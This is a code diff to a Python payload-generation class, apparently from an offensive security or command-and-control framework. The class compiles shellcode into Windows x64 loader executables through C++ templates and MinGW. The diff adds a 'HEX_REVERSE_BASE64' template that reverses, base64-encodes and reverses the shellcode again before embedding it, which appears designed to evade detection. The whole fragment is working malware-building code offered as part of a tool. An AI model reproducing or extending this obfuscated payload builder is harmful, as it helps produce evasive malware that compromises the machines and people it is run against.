@@ -289,7 +289,7 @@ class Payload(object):
         return byteresult
 
     @staticmethod
-    def _create_payload_by_mingw(mname=None, shellcode=None, template="REVERSE_HEX"):
+    def _create_payload_by_mingw(mname, shellcode, template):
 
         if mname.startswith('windows/x64'):
             arch = 'x64'
@@ -310,7 +310,14 @@ class Payload(object):
             tpl = env.get_template(f'{template}.cpp')
             reverse_hex_str = bytes.decode(shellcode)[::-1]
             src = tpl.render(SHELLCODE_STR=reverse_hex_str)
-            mingwx64 = Mingw(MINGW_INCULDE_DIR, src)
+            mingwx64 = Mingw(None, src)
+            byteresult = mingwx64.compile_cpp(arch=arch)
+        elif template in ["HEX_REVERSE_BASE64"]:
+            tpl = env.get_template(f'{template}.cpp')
+            hex_reverse_str = bytes.decode(shellcode)[::-1]
+            hex_reverse_base64_str = base64.b64encode(hex_reverse_str.encode()).decode()[::-1]
+            src = tpl.render(SHELLCODE_STR=hex_reverse_base64_str)
+            mingwx64 = Mingw(None, src)
             byteresult = mingwx64.compile_cpp(arch=arch)
         else:
             raise Exception('unspport template')
